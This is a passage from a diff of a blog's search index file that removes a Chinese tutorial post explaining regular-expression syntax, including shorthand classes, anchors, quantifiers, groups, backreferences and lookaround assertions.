-<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
-<p><code>\w</code>单词，匹配字母、数字、下划线</p>
-<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
-<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
-<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
-<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
-<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
-<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
-<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
-<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
-<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
-<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
-<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
-<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
-<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
-<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
-<p><code>|</code>或者条件</p>
-<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
-<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
-<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
-<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
-<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
-<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
-<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
-<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
-<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
-<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
-<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
-<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
-]]></content>
-      <tags>
-        <tag>正则表达式</tag>
       </tags>
   </entry>
 </search>
